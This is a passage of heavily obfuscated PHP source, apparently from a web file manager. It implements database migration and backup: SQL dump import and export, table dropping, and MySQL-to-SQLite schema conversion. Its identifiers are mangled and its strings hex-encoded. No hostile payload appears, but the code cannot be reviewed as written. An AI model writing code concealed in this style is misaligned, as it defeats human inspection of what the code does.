$á‡ÈÂˆÎ->execute("\143\162\x65\141\x74\x65\40\x64\x61\x74\x61\x62\x61\x73\145\40\x60{$¸±·¤}\x60"); } $—Ó¬ı®¶[$ÛËÑ‰€×[1080]] = $¸±·¤; if ($—Ó¬ı®¶[$ÛËÑ‰€×[1075]] == $ÛËÑ‰€×[1072]) { $—Ó¬ı®¶[$ÛËÑ‰€×[1081]] .= $ÛËÑ‰€×[1167] . $¸±·¤; } $this->database = $—Ó¬ı®¶; $á‡ÈÂˆÎ->execute("\165\x73\x65\x20\x60{$¸±·¤}\140"); return $á‡ÈÂˆÎ; } public function createTable($É¸¼£ú, &$Ş©“ÊË) { $¬»ÆäÙ¥ =& $_SERVER[åÄ¼Ùßš]; if (!IO::exist($É¸¼£ú)) { ActionCall($¬»ÆäÙ¥[1168], !0, 0); show_json(LNG($¬»ÆäÙ¥[1169]), !1); } $¢®Äºµ« = $this->model()->db(); $¼¯Ä®Àº = sqlSplit(IO::getContent($É¸¼£ú)); foreach ($¼¯Ä®Àº as $æâû¡Ã) { $•ıàß×‚ = stripos($æâû¡Ã, $¬»ÆäÙ¥[1170]) === 0; if ($•ıàß×‚) { $Ş©“ÊË->task[$¬»ÆäÙ¥[1171]] += 1; } $¢®Äºµ«->execute($æâû¡Ã); if ($•ıàß×‚) { preg_match($¬»ÆäÙ¥[1172], $æâû¡Ã, $ŠÜŞ¬’à); $Ş©“ÊË->task[$¬»ÆäÙ¥[1173]] = $ŠÜŞ¬’à[1]; $Ş©“ÊË->update(1); } } } public function insertTable($Ö¹çÄÙ‚, &$„Ö¿†İ†) { $Êé†£–Û =& $_SERVER[åÄ¼Ùßš]; $É¼Û“ = $this->model()->db(); $š¯Ü•á = $¥ÁñÜƒÄ ? array($¥ÁñÜƒÄ) : $É¼Û“->getTables(); foreach ($Ö¹çÄÙ‚ as $€º¢áÛ…) { $¥ÁñÜƒÄ = basename($€º¢áÛ…, $Êé†£–Û[886]); if (!in_array($¥ÁñÜƒÄ, $š¯Ü•á)) { continue; } $„Ö¿†İ†->task[$Êé†£–Û[1173]] = $¥ÁñÜƒÄ; if (get_filesize($€º¢áÛ…) == 0) { continue; } $ƒÀşÇ„ = $this->sqlToDb($€º¢áÛ…, $„Ö¿†İ†); if (!$ƒÀşÇ„) { ActionCall($Êé†£–Û[1168], !0, 0); show_json(LNG($Êé†£–Û[1174]) . "\133{$¥ÁñÜƒÄ}\x5d", !1); } } } public function sqlFromDb($èÔÓæÌ¤, $Â®üÇöá, &$Æ¸‡™ºÉ, $ô•¼Çã² = '') { if ($Æ¸‡™ºÉ) { $Æ¸‡™ºÉ->task[$_SERVER[åÄ¼Ùßš][1173]] = $èÔÓæÌ¤; } $‡º£°­ = $this->model($èÔÓæÌ¤); $¸øºİÁ– = 0; $éäƒ’ç¨ = 0; $ÚÇ±Áàê = 10000; $œÄ‚şˆˆ = fopen($Â®üÇöá, $_SERVER[åÄ¼Ùßš][1175]); $õ­¡Òæñ = $‡º£°­->getPk(); $è¡¹®÷ö = $‡º£°­->getDbFields(); $€ÖÇô¹÷ = $_SERVER[åÄ¼Ùßš][12]; if ($GLOBALS[$_SERVER[åÄ¼Ùßš][885]] && in_array($èÔÓæÌ¤, array($_SERVER[åÄ¼Ùßš][1176], $_SERVER[åÄ¼Ùßš][1177]))) { $€ÖÇô¹÷ = $èÔÓæÌ¤; } do { $Ù«õ»áÆ = array($õ­¡Òæñ => array($_SERVER[åÄ¼Ùßš][1122], $éäƒ’ç¨)); $‡®¥÷‰à = $‡º£°­->where($Ù«õ»áÆ)->field($è¡¹®÷ö)->order($õ­¡Òæñ . $_SERVER[åÄ¼Ùßš][1178])->limit($ÚÇ±Áàê)->select(); $‡®¥÷‰à = !empty($‡®¥÷‰à) ? $‡®¥÷‰à : array(); if (!($‚Ë­†îì = count($‡®¥÷‰à))) { break; } $—•¶’ğá = end($‡®¥÷‰à); $éäƒ’ç¨ = $—•¶’ğá[$õ­¡Òæñ]; $‹…¹Œı = array(); foreach ($‡®¥÷‰à as $÷™·Ø‡ö) { if ($€ÖÇô¹÷) { if ($èÔÓæÌ¤ == $_SERVER[åÄ¼Ùßš][1176]) { if ($÷™·Ø‡ö[$_SERVER[åÄ¼Ùßš][33]] == $_SERVER[åÄ¼Ùßš][1179]) { $èï»š  = json_decode($÷™·Ø‡ö[$_SERVER[åÄ¼Ùßš][452]], !0); if ($èï»š [$_SERVER[åÄ¼Ùßš][32]] == $GLOBALS[$_SERVER[åÄ¼Ùßš][885]] && $èï»š [$_SERVER[åÄ¼Ùßš][843]] != 1) { continue; } } } else { if ($÷™·Ø‡ö[$_SERVER[åÄ¼Ùßš][33]] == $_SERVER[åÄ¼Ùßš][1180] && $÷™·Ø‡ö[$_SERVER[åÄ¼Ùßš][97]] == $_SERVER[åÄ¼Ùßš][881]) { continue; } } } if ($ô•¼Çã²) { $÷™·Ø‡ö[$_SERVER[åÄ¼Ùßš][87]] = "\173\151\x6f\x3a{$ô•¼Çã²}\x7d" . substr($÷™·Ø‡ö[$_SERVER[åÄ¼Ùßš][87]], strlen("\x7b\151\157\x3a{$÷™·Ø‡ö[$_SERVER[åÄ¼Ùßš][919]]}\175")); $÷™·Ø‡ö[$_SERVER[åÄ¼Ùßš][919]] = $ô•¼Çã²; } $‹…¹Œı[] = $_SERVER[åÄ¼Ùßš][1181] . $this->sqlEncode($÷™·Ø‡ö) . $_SERVER[åÄ¼Ùßš][1182]; } $ÜÒ±ß‡Ğ = "\111\x4e\x53\105\122\x54\x20\111\116\124\x4f\40\140{$èÔÓæÌ¤}\x60\40\x28\x60" . implode($_SERVER[åÄ¼Ùßš][1183], $è¡¹®÷ö) . $_SERVER[åÄ¼Ùßš][1184]; fwrite($œÄ‚şˆˆ, $ÜÒ±ß‡Ğ . implode($_SERVER[åÄ¼Ùßš][1185], $‹…¹Œı) . $_SERVER[åÄ¼Ùßš][74] . PHP_EOL); $¸øºİÁ– += $‚Ë­†îì; if ($Æ¸‡™ºÉ) { $Æ¸‡™ºÉ->update($‚Ë­†îì); } } while ($ÚÇ±Áàê == $‚Ë­†îì); fclose($œÄ‚şˆˆ); return $¸øºİÁ–; } public function sqlToDb($…»Éì˜Û, &$š–Ë¬ºÅ) { $ ûıÅ÷ =& $_SERVER[åÄ¼Ùßš]; $Ä›Ò«¶ = $this->model()->db(); $û¾æµÑ = @fopen($…»Éì˜Û, $ ûıÅ÷[1186]); if (!$û¾æµÑ) { return !1; } $›é¯Ëà = 0; $™×Âù“© = $ ûıÅ÷[12]; $¾äÍ±Ì¾ = array(); $áïã€» = $this->dbType(); $¬òş²¬Î = $áïã€» == $ ûıÅ÷[13] ? 500 : 2000; $şÍ¾ÍØ = basename($…»Éì˜Û, $ ûıÅ÷[886]); $ñ†‚‚™È = 0; $¦¬†Ïé© = 4194304; while (!feof($û¾æµÑ)) { $ª™¬¦‘ä = trim(fgets($û¾æµÑ)); if (!$ª™¬¦‘ä) { continue; } $ôéÏÖ‘¤ = $this->sqlDecode($ª™¬¦‘ä, $áïã€», $şÍ¾ÍØ); if (stripos($ôéÏÖ‘¤, $ ûıÅ÷[432]) === 0) { if (!$™×Âù“©) { $™×Âù“© = $ôéÏÖ‘¤ . $ ûıÅ÷[53]; } continue; } if ($š–Ë¬ºÅ) { $š–Ë¬ºÅ->task[$ ûıÅ÷[1171]] += 1; } $›é¯Ëà++; $¾äÍ±Ì¾[] = rtrim(rtrim(trim($ôéÏÖ‘¤), $ ûıÅ÷[50]), $ ûıÅ÷[74]); $¹é¤ø® = null; $èïãüÒ = strlen($ôéÏÖ‘¤); $ñ†‚‚™È += $èïãüÒ; $ší÷Üò = strlen($™×Âù“©) + $ñ†‚‚™È + (count($¾äÍ±Ì¾) - 1); if ($ší÷Üò >= $¦¬†Ïé©) { $¹é¤ø® = array_pop($¾äÍ±Ì¾); if ($›é¯Ëà > 1) { $›é¯Ëà--; } } if ($›é¯Ëà >= $¬òş²¬Î || $¹é¤ø®) { $ôéÏÖ‘¤ = $™×Âù“© . implode($ ûıÅ÷[50], $¾äÍ±Ì¾); if (!$Ä›Ò«¶->execute($ôéÏÖ‘¤)) { return !1; } if ($š–Ë¬ºÅ) { $š–Ë¬ºÅ->update($›é¯Ëà); } $¾äÍ±Ì¾ = array(); $›é¯Ëà = 0; $ñ†‚‚™È = 0; if ($¹é¤ø®) { $¾äÍ±Ì¾ = array($¹é¤ø®); $›é¯Ëà = 1; $ñ†‚‚™È = $èïãüÒ; } } } fclose($û¾æµÑ); if (!empty($¾äÍ±Ì¾)) { $ôéÏÖ‘¤ = $™×Âù“© . implode($ ûıÅ÷[50], $¾äÍ±Ì¾); if (!$Ä›Ò«¶->execute($ôéÏÖ‘¤)) { return !1; } if ($š–Ë¬ºÅ) { $š–Ë¬ºÅ->update($›é¯Ëà); } } return !0; } public function dropTable($ĞÍœ‘ œ = null) { $°»‚¶ëÎ =& $_SERVER[åÄ¼Ùßš]; $‹Õ‰íöÙ = $this->model()->db(); $¡¶÷Î„ = $ĞÍœ‘ œ ? array($ĞÍœ‘ œ) : $‹Õ‰íöÙ->getTables(); if (!$¡¶÷Î„) { return; } foreach ($¡¶÷Î„ as $ĞÍœ‘ œ) { if ($ĞÍœ‘ œ) { $ĞÍœ‘ œ = strtolower($ĞÍœ‘ œ); } else { continue; } $‹Õ‰íöÙ->execute($°»‚¶ëÎ[1187] . $this->escapeName($ĞÍœ‘ œ) . $°»‚¶ëÎ[1188]); } } private function sqlEncode($ëÖª‹­Á) { $º¢µöé˜ =& $_SERVER[åÄ¼Ùßš]; $”İÁØ›« = array(); foreach ($ëÖª‹­Á as $¡ıÈèşî) { if (is_array($¡ıÈèşî)) { $¡ıÈèşî = json_encode_force($¡ıÈèşî); } $¡ıÈèşî = addslashes($¡ıÈèşî); $¡ıÈèşî = str_replace(array($º¢µöé˜[1189], $º¢µöé˜[288], $º¢µöé˜[419]), array($º¢µöé˜[1190], $º¢µöé˜[1191], $º¢µöé˜[1192]), $¡ıÈèşî); $”İÁØ›«[] = $¡ıÈèşî; } return $º¢µöé˜[58] . implode($º¢µöé˜[1193], $”İÁØ›«) . $º¢µöé˜[58]; } private function sqlDecode($„òÖ»…, $ŠçÛã©, $ÓÕüß÷ = '') { $å£¼ùÔ =& $_SERVER[åÄ¼Ùßš]; $„òÖ»… = str_replace(array($å£¼ùÔ[1190], $å£¼ùÔ[1191], $å£¼ùÔ[1192]), array($å£¼ùÔ[1189], $å£¼ùÔ[288], $å£¼ùÔ[419]), $„òÖ»…); if ($ŠçÛã© == $å£¼ùÔ[13]) { $„òÖ»… = str_ireplace($å£¼ùÔ[1194], $å£¼ùÔ[59], $„òÖ»…); $„òÖ»… = stripslashes($„òÖ»…); } return preg_replace($å£¼ùÔ[1195], $å£¼ùÔ[12], $„òÖ»…); if ($ŠçÛã© == $å£¼ùÔ[13]) { return $ÓÕüß÷ != $å£¼ùÔ[880] ? stripslashes($„òÖ»…) : $„òÖ»…; } if ($ÓÕüß÷ == $å£¼ùÔ[880]) { $„òÖ»… = str_replace($å£¼ùÔ[1196], $å£¼ùÔ[121], stripslashes($„òÖ»…)); } return $„òÖ»…; } public function getSqlFile($ˆ‹Úéü‘ = '') { $«Êüª»¾ =& $_SERVER[åÄ¼Ùßš]; $É—²¬æ¡ = $this->dbType(!0); $«Şƒ‡áø = CONTROLLER_DIR . "\151\x6e\163\x74\x61\x6c\154\57\x64\x61\164\141\x2f{$É—²¬æ¡}\x2e\163\161\154"; if (!file_exists($«Şƒ‡áø)) { return !1; } $Ï‰´šª = file_get_contents($«Şƒ‡áø); $•”«Ãó = $«Êüª»¾[1197] . ($É—²¬æ¡ == $«Êüª»¾[904] ? $«Êüª»¾[1198] : $«Êüª»¾[1199]) . $«Êüª»¾[1200]; preg_match_all($•”«Ãó, $Ï‰´šª, $¡ë¤âÃ); $æÜ¸±¢Á = $¡ë¤âÃ[1]; $¦óàîû‚ = $this->model()->db(); $Âàà¦„¥ = $¦óàîû‚->getTables(); $êÕÃª¨‹ = TEMP_FILES . $«Êüª»¾[1201] . date($«Êüª»¾[262]) . $«Êüª»¾[8]; del_dir($êÕÃª¨‹); mk_dir($êÕÃª¨‹); $éúñÒá£ = $êÕÃª¨‹ . $«Êüª»¾[1202]; $­Ş¶îÀ = $êÕÃª¨‹ . $«Êüª»¾[1203]; $Ç¦Ç‚˜™ = $É—²¬æ¡ == $«Êüª»¾[13] ? $«Êüª»¾[904] : $«Êüª»¾[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\164\141\x6c\x6c\57\x64\x61\164\x61\x2f{$Ç¦Ç‚˜™}\56\x73\x71\154", $êÕÃª¨‹); @touch($êÕÃª¨‹ . $É—²¬æ¡ . $«Êüª»¾[886]); $¡€»ãšâ = fopen($éúñÒá£, $«Êüª»¾[1175]); $‹±÷ßìş = fopen($­Ş¶îÀ, $«Êüª»¾[1175]); if ($É—²¬æ¡ == $«Êüª»¾[13]) { $Âàà¦„¥ = array_diff($Âàà¦„¥, array($«Êüª»¾[878], $«Êüª»¾[879])); $Î©¶ã’£ = array($«Êüª»¾[1204], $«Êüª»¾[1205], $«Êüª»¾[1206]); fwrite($‹±÷ßìş, implode(PHP_EOL, $Î©¶ã’£) . PHP_EOL . PHP_EOL); foreach ($Âàà¦„¥ as $§““˜ïÃ) { $Øç“ìë = $this->sqlFromSqlite($§““˜ïÃ); if (!$Øç“ìë[$«Êüª»¾[13]]) { continue; } fwrite($‹±÷ßìş, $Øç“ìë[$«Êüª»¾[13]] . PHP_EOL . PHP_EOL); if (!in_array($§““˜ïÃ, $æÜ¸±¢Á)) { fwrite($¡€»ãšâ, $Øç“ìë[$«Êüª»¾[904]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Âàà¦„¥ as $§““˜ïÃ) { $Øç“ìë = $this->sqlFromMysql($§““˜ïÃ); if (!$Øç“ìë[$«Êüª»¾[904]]) { continue; } fwrite($¡€»ãšâ, $Øç“ìë[$«Êüª»¾[904]] . PHP_EOL . PHP_EOL); if (!in_array($§““˜ïÃ, $æÜ¸±¢Á)) { fwrite($‹±÷ßìş, $Øç“ìë[$«Êüª»¾[13]] . PHP_EOL . PHP_EOL); } } } fclose($¡€»ãšâ); fclose($‹±÷ßìş); $Ï‰´šª = array($«Êüª»¾[904] => $éúñÒá£, $«Êüª»¾[13] => $­Ş¶îÀ); return $ˆ‹Úéü‘ ? $Ï‰´šª[$ˆ‹Úéü‘] : $Ï‰´šª; } public function dbType($Ğ”µš © = false) { $äøç‰Í˜ =& $_SERVER[åÄ¼Ùßš]; $±¥“”¾¼ = $Ğ”µš © ? $GLOBALS[$äøç‰Í˜[6]][$äøç‰Í˜[21]] : $this->database; $±¥“”¾¼ = array_change_key_case($±¥“”¾¼); $ğ«Ù»‰¦ = $±¥“”¾¼[$äøç‰Í˜[1075]]; if ($ğ«Ù»‰¦ == $äøç‰Í˜[1072]) { $Î‡éÄüÙ = explode($äøç‰Í˜[4], $±¥“”¾¼[$äøç‰Í˜[1081]]); $ğ«Ù»‰¦ = $Î‡éÄüÙ[0]; } $ùã†Ÿú = array($äøç‰Í˜[1207] => $äøç‰Í˜[13], $äøç‰Í˜[1020] => $äøç‰Í˜[904]); if (isset($ùã†Ÿú[$ğ«Ù»‰¦])) { $ğ«Ù»‰¦ = $ùã†Ÿú[$ğ«Ù»‰¦]; } return $ğ«Ù»‰¦; } public function sqlFromMysql($„×İÃÛ, $¥ÂäòÀ = '') { $›úú£±ä =& $_SERVER[åÄ¼Ùßš]; $„äÜá›“ = array($›úú£±ä[904] => $›úú£±ä[12], $›úú£±ä[13] => $›úú£±ä[12]); $ÎÙ°ù¿è = $this->escapeName($„×İÃÛ); $Ê™ôçÁ = $this->escapeName($„×İÃÛ, $›úú£±ä[13]); $ößìÂŸƒ = $this->model()->db(); $¸š‰·ÙØ = $ößìÂŸƒ->query("\163\150\x6f\167\40\x63\162\x65\x61\x74\x65\x20\x74\x61\142\x6c\145\x20{$ÎÙ°ù¿è}\73"); if (!$¸š‰·ÙØ || !$¸š‰·ÙØ[0]) { return !1; } $­”Ò¬¹Ÿ = _get($¸š‰·ÙØ[0], $›úú£±ä[1208], $›úú£±ä[12]); if (!$­”Ò¬¹Ÿ) { return !1; } $ÍÒõë¹ = "\104\122\x4f\x50\x20\x54\x41\102\x4c\x45\x20\x49\x46\x20\105\130\x49\123\124\x53\x20{$ÎÙ°ù¿è}\x3b" . PHP_EOL . $­”Ò¬¹Ÿ . $›úú£±ä[74]; if ($¥ÂäòÀ == $›úú£±ä[904]) { return $ÍÒõë¹; } $„äÜá›“[$›úú£±ä[904]] = $ÍÒõë¹; $²Ù½»Ï’ = array_change_key_case($GLOBALS[$›úú£±ä[6]][$›úú£±ä[21]]); $ì¹‘ã‡¥ = $²Ù½»Ï’[$›úú£±ä[1080]]; $ùêèËñ = $›úú£±ä[1209] . $ì¹‘ã‡¥ . "\47\x20\x41\x4e\x44\x20\x54\101\102\x4c\105\137\x4e\101\115\x45\40\x3d\40{$Ê™ôçÁ}\x3b"; $ùô³Î¸ = "\123\110\117\x57\40\111\116\x44\x45\x58\40\106\122\117\115\x20{$ÎÙ°ù¿è}\73"; $÷‹œŸä½ = $ößìÂŸƒ->query($ùêèËñ); if (empty($÷‹œŸä½)) { return $¥ÂäòÀ ? $„äÜá›“[$¥ÂäòÀ] : $„äÜá›“; } $ğË­Ø½É = $ößìÂŸƒ->query($ùô³Î¸); $•âøÀ‚î = $›úú£±ä[12]; $Ø³Ìùæè = array(); foreach ($ğË­Ø½É as $ÀíÃÀú¬) { if (!$•âøÀ‚î && $ÀíÃÀú¬[$›úú£±ä[1210]] == $›úú£±ä[1211]) { $•âøÀ‚î = $ÀíÃÀú¬[$›úú£±ä[1212]]; } if (isset($Ø³Ìùæè[$ÀíÃÀú¬[$›úú£±ä[1210]]])) { $Ø³Ìùæè[$ÀíÃÀú¬[$›úú£±ä[1210]]][$›úú£±ä[1213]][] = $ÀíÃÀú¬[$›úú£±ä[1212]]; continue; } $Ø³Ìùæè[$ÀíÃÀú¬[$›úú£±ä[1210]]] = array($›úú£±ä[1214] => $ÀíÃÀú¬[$›úú£±ä[1210]], $›úú£±ä[1213] => array($ÀíÃÀú¬[$›úú£±ä[1212]]), $›úú£±ä[1215] => $ÀíÃÀú¬[$›úú£±ä[1216]] == $›úú£±ä[91] ? 0 : 1); } $ä¤õ¾µÏ = array(); foreach ($Ø³Ìùæè as $ÀíÃÀú¬) { $¬«„™“Ÿ = $ÀíÃÀú¬[$›úú£±ä[1214]] == $›úú£±ä[1211]; $ÈÈ’¨õ³ = $ÀíÃÀú¬[$›úú£±ä[1215]] == $›úú£±ä[91] && !$¬«„™“Ÿ ? $›úú£±ä[1217] : $›úú£±ä[12]; $èíÏ²Ó· = $›úú£±ä[1218] . $„×İÃÛ . $›úú£±ä[11] . ($¬«„™“Ÿ ? $›úú£±ä[1219] : $ÀíÃÀú¬[$›úú£±ä[1214]]); $½ş…™¿ = $›úú£±ä[1220] . implode($›úú£±ä[1221], $ÀíÃÀú¬[$›úú£±ä[1213]]) . $›úú£±ä[1222]; $ä¤õ¾µÏ[] = sprintf($›úú£±ä[1223], $›úú£±ä[1224], $ÈÈ’¨õ³, $›úú£±ä[1225], $èíÏ²Ó·, $›úú£±ä[1226], $½ş…™¿); } $ô¸ùÊè = array(); $Ò‚Ü¹… = array($›úú£±ä[1227] => $›úú£±ä[392], $›úú£±ä[1228] => $›úú£±ä[392], $›úú£±ä[366] => $›úú£±ä[392], $›úú£±ä[365] => $›úú£±ä[392], $›úú£±ä[1229] => $›úú£±ä[1230], $›úú£±ä[1231] => $›úú£±ä[1230], $›úú£±ä[1230] => $›úú£±ä[1230], $›úú£±ä[1232] => $›úú£±ä[1230], $›úú£±ä[285] => $›úú£±ä[1230], $›úú£±ä[1233] => $›úú£±ä[1230], $›úú£±ä[1234] => $›úú£±ä[1230], $›úú£±ä[1235] => $›úú£±ä[1236], $›úú£±ä[367] => $›úú£±ä[1236], $›úú£±ä[368] => $›úú£±ä[1236], $›úú£±ä[1237] => $›úú£±ä[1237]); foreach ($÷‹œŸä½ as $ÀíÃÀú¬) { $¥ÂäòÀ = _get($Ò‚Ü¹…, $ÀíÃÀú¬[$›úú£±ä[1238]], $ÀíÃÀú¬[$›úú£±ä[1239]]); $¶ûŸ­Ìİ = $ÀíÃÀú¬[$›úú£±ä[1240]] == $›úú£±ä[1003] ? $›úú£±ä[1241] : $›úú£±ä[1242]; $²¹Ùâ” = $ÀíÃÀú¬[$›úú£±ä[1243]] == $•âøÀ‚î ? $›úú£±ä[1244] : $›úú£±ä[12]; $¼—è±Î = $ÀíÃÀú¬[$›úú£±ä[1057]] ? strtoupper(str_replace($›úú£±ä[11], $›úú£±ä[12], $ÀíÃÀú¬[$›úú£±ä[1057]])) : $›úú£±ä[12]; $ô¸ùÊè[] = sprintf($›úú£±ä[1245], $ÀíÃÀú¬[$›úú£±ä[1243]], $¥ÂäòÀ, $¶ûŸ­Ìİ, $²¹Ùâ”, $¼—è±Î); } $ÊÅ×Î°ã = array("\x44\x52\117\x50\40\124\101\102\114\x45\40\111\106\x20\105\x58\x49\x53\124\123\x20{$Ê™ôçÁ}\73", "\x43\122\x45\x41\124\x45\x20\x54\101\x42\x4c\105\x20{$Ê™ôçÁ}\40\x28", implode($›úú£±ä[50] . PHP_EOL, $ô¸ùÊè), $›úú£±ä[1246]); $»«’ˆÇØ = implode(PHP_EOL, array_merge($ÊÅ×Î°ã, $ä¤õ¾µÏ)); if ($¥ÂäòÀ == $›úú£±ä[13]) { return $»«’ˆÇØ; } $„äÜá›“[$›úú£±ä[13]] = $»«’ˆÇØ; return $„äÜá›“; } public function sqlFromSqlite($•³”¼Ø, $«‚ÏÄ = '') { $•Ø²ÕØş =& $_SERVER[åÄ¼Ùßš]; $‘¤Æ°¿’ = array($•Ø²ÕØş[904] => $•Ø²ÕØş[12], $•Ø²ÕØş[13] => $•Ø²ÕØş[12]); $óğîåüî = $this->escapeName($•³”¼Ø); $’‡¶ñı¨ = $this->escapeName($•³”¼Ø, $•Ø²ÕØş[13]); $Ä’šâÃö = $this->model()->db(); $·ß÷Ï¹É = "\x50\122\x41\107\x4d\x41\40\x54\101\102\114\x45\137\x49\x4e\106\117\x20\50\x27{$•³”¼Ø}\47\x29"; $ôÅ´Îá¸ = "\x53\105\114\x45\x43\124\x20\x2a\x20\106\x52\x4f\115\x20\163\x71\x6c\x69\164\145\137\155\141\163\x74\145\x72\x20\x57\110\x45\122\x45\x20\164\142\154\x5f\156\141\155\145\40\75\x20\47{$•³”¼Ø}\47"; $««˜‹¥• = $Ä’šâÃö->query($·ß÷Ï¹É); if (empty($««˜‹¥•)) { return $«‚ÏÄ ? $‘¤Æ°¿’[$«‚ÏÄ] : $‘¤Æ°¿’; } $£ÌšÎÛå = $Ä’šâÃö->query($ôÅ´Îá¸); $Í§Üó´ = $¡«×ó‹„ = array(); foreach ($£ÌšÎÛå as $¸ÃÒ¬Ù) { if ($¸ÃÒ¬Ù[$•Ø²ÕØş[33]] == $•Ø²ÕØş[359]) { $Í§Üó´[] = $¸ÃÒ¬Ù[$•Ø²ÕØş[1247]]; } else { $¡«×ó‹„[$¸ÃÒ¬Ù[$•Ø²ÕØş[32]]] = $¸ÃÒ¬Ù[$•Ø²ÕØş[1247]]; } } $„ø¹š„ì = array_merge(array("\x44\122\x4f\x50\40\124\101\102\x4c\105\40\x49\x46\x20\x45\130\111\123\124\123\40{$’‡¶ñı¨}\73"), $Í§Üó´, array_values($¡«×ó‹„)); $„ø¹š„ì = implode($•Ø²ÕØş[74] . PHP_EOL, $„ø¹š„ì) . $•Ø²ÕØş[74]; if ($«‚ÏÄ == $•Ø²ÕØş[13]) { return $„ø¹š„ì; } $‘¤Æ°¿’[$•Ø²ÕØş[13]] = $„ø¹š„ì; $¿Ûç®Í = array(); $®Ÿİ¯ = array(); foreach ($¡«×ó‹„ as $ßÅÊŸá• => $âş¡©ö) { $ıÒåÔ = str_replace($•Ø²ÕØş[1218] . $•³”¼Ø . $•Ø²ÕØş[11], $•Ø²ÕØş[12], $ßÅÊŸá•); $ıÒåÔ = str_replace($•³”¼Ø . $•Ø²ÕØş[11], $•Ø²ÕØş[12], $ıÒåÔ); $¶—¹¤Ò = str_replace(array($•Ø²ÕØş[121], $•Ø²ÕØş[1065]), $•Ø²ÕØş[473], substr($âş¡©ö, stripos($âş¡©ö, $•Ø²ÕØş[340]))); $¿Ûç®Í[$ıÒåÔ] = $¶—¹¤Ò; $®Ÿİ¯[$ıÒåÔ] = $âş¡©ö; } $¼ãúí = array(); $ÌÈµÙÁ = array(); $Œ‘ İğ° = array($•Ø²ÕØş[1228] => $•Ø²ÕØş[1248], $•Ø²ÕØş[392] => $•Ø²ÕØş[1249], $•Ø²ÕØş[1236] => $•Ø²ÕØş[1250], $•Ø²ÕØş[1230] => $•Ø²ÕØş[1232], $•Ø²ÕØş[1237] => $•Ø²ÕØş[1251]); $ûš¯Âõ‡ = $ö§ÀôÆ¨ = $•Ø²ÕØş[12]; foreach ($««˜‹¥• as $¸ÃÒ¬Ù) { $û»½éÂ = $¸ÃÒ¬Ù[$•Ø²ÕØş[33]]; if ($û»½éÂ == $•Ø²ÕØş[1230] && isset($¿Ûç®Í[$¸ÃÒ¬Ù[$•Ø²ÕØş[32]]])) { $û»½éÂ = $•Ø²ÕØş[1252]; } $ÌÈµÙÁ[$¸ÃÒ¬Ù[$•Ø²ÕØş[32]]] = $û»½éÂ; $«‚ÏÄ = _get($Œ‘ İğ°, $û»½éÂ, $û»½éÂ); $‡ÑÒ†¸› = $•Ø²ÕØş[12]; if ($¸ÃÒ¬Ù[$•Ø²ÕØş[57]] == $•Ø²ÕØş[91]) { if (stripos($û»½éÂ, $•Ø²ÕØş[366]) !== !1) { $‡ÑÒ†¸› = $•Ø²ÕØş[1253]; } $ûš¯Âõ‡ = $¸ÃÒ¬Ù[$•Ø²ÕØş[32]]; } $¡¾º®Öà = $¸ÃÒ¬Ù[$•Ø²ÕØş[56]] === null ? $•Ø²ÕØş[1254] : (is_string($¸ÃÒ¬Ù[$•Ø²ÕØş[56]]) ? "\47{$¸ÃÒ¬Ù[$•Ø²ÕØş[56]]}\47" : $¸ÃÒ¬Ù[$•Ø²ÕØş[56]]); $ëŸı˜ö‡ = $¸ÃÒ¬Ù[$•Ø²ÕØş[35]] == $•Ø²ÕØş[91] ? $•Ø²ÕØş[1241] : $•Ø²ÕØş[1255] . $¡¾º®Öà; $¼ãúí[] = sprintf($•Ø²ÕØş[1256], $¸ÃÒ¬Ù[$•Ø²ÕØş[32]], $«‚ÏÄ, $ëŸı˜ö‡, $‡ÑÒ†¸›); } foreach ($¿Ûç®Í as $ıÒåÔ => $¶—¹¤Ò) { if (stripos($®Ÿİ¯[$ıÒåÔ], $•Ø²ÕØş[1211]) !== !1) { $óªô–ÍÏ = $ö§ÀôÆ¨ = $•Ø²ÕØş[1257] . $ûš¯Âõ‡ . $•Ø²ÕØş[1258]; } else { $ëÛù¯Î¡ = stripos($®Ÿİ¯[$ıÒåÔ], $•Ø²ÕØş[1217]) !== !1; $©‡àªê = !1; $–ˆ„ŒßŠ = array(); $Ù¾•ü·Ï = explode($•Ø²ÕØş[50], rtrim(ltrim($¶—¹¤Ò, $•Ø²ÕØş[340]), $•Ø²ÕØş[1010])); foreach ($Ù¾•ü·Ï as $ßÅÊŸá•) { $ßÅÊŸá• = trim($ßÅÊŸá•, $•Ø²ÕØş[1005]); if (isset($ÌÈµÙÁ[$ßÅÊŸá•]) && $ÌÈµÙÁ[$ßÅÊŸá•] == $•Ø²ÕØş[1252]) { $©‡àªê = !0; $–ˆ„ŒßŠ[] = "\x60{$ßÅÊŸá•}\140\50\x32\x35\x30\51"; } else { $–ˆ„ŒßŠ[] = "\x60{$ßÅÊŸá•}\140"; } } if ($©‡àªê) { $¶—¹¤Ò = $•Ø²ÕØş[340] . implode($•Ø²ÕØş[50], $–ˆ„ŒßŠ) . $•Ø²ÕØş[1010]; } $óªô–ÍÏ = ($ëÛù¯Î¡ ? $•Ø²ÕØş[1259] : $•Ø²ÕØş[12]) . "\x4b\105\x59\x20\x60{$ıÒåÔ}\x60\x20{$¶—¹¤Ò}"; } $¼ãúí[] = $óªô–ÍÏ; } if ($ûš¯Âõ‡ && !$ö§ÀôÆ¨) { $¼ãúí = array_merge(array($•Ø²ÕØş[1257] . $ûš¯Âõ‡ . $•Ø²ÕØş[1258]), $¼ãúí); } $¾ÊÓı¤ü = array("\x44\x52\117\120\40\124\x41\102\x4c\x45\x20\x49\x46\x20\x45\x58\x49\x53\x54\x53\40{$óğîåüî}\73", "\x43\x52\105\x41\x54\105\x20\124\101\x42\114\105\x20{$óğîåüî}\40\50", implode($•Ø²ÕØş[50] . PHP_EOL, $¼ãúí), $•Ø²ÕØş[1260]); $…ëîØ†ò = implode(PHP_EOL, $¾ÊÓı¤ü); if ($«‚ÏÄ == $•Ø²ÕØş[904]) { return $…ëîØ†ò; } $‘¤Æ°¿’[$•Ø²ÕØş[904]] = $…ëîØ†ò; return $‘¤Æ°¿’; } private function escapeName($ÛÊıŒŒ, $±²›şÜÂ = "\155\x79\x73\161\154") { $Éø­•¶í =& $_SERVER[åÄ¼Ùßš]; $ÛÊıŒŒ = preg_replace($Éø­•¶í[1261], $Éø­•¶í[12], $ÛÊıŒŒ); if ($±²›şÜÂ === $Éø­•¶í[904]) { return "\x60{$ÛÊıŒŒ}\x60"; } return "\x22{$ÛÊıŒŒ}\x22"; } } goto d•íì¨Àã‘; E’¢Î³ªÍ: class SystemNoticeModel extends ModelBaseLight { public $optionType = 